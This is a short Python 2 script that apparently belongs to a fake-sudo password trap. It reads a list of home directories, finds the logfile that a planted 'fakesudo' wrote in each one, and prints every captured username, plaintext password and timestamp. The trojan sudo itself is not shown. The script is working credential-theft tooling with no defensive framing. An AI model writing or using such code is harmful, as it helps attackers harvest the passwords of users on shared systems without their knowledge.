#! /usr/bin/python
# -*- coding: UTF-8 -*-
import time

with open("logNames", "r") as file:
	raw = file.read()

for line in raw.splitlines():
	lineParsed  = line.split("|")
	home = lineParsed[2] + "/"
	sudoLoc = home + lineParsed[0] # location of fakesudo
	logLoc = home + lineParsed[1] # location of logfile
	try:
		with open(logLoc, "r") as file:
			data = file.read()
			for passwd in data.splitlines():
				info = passwd.split("|")
				opened = time.ctime(float(info[2]))
				print "User: %s, pass:'%s', at: %s" % (info[0], info[1], opened)
	except:
		pass
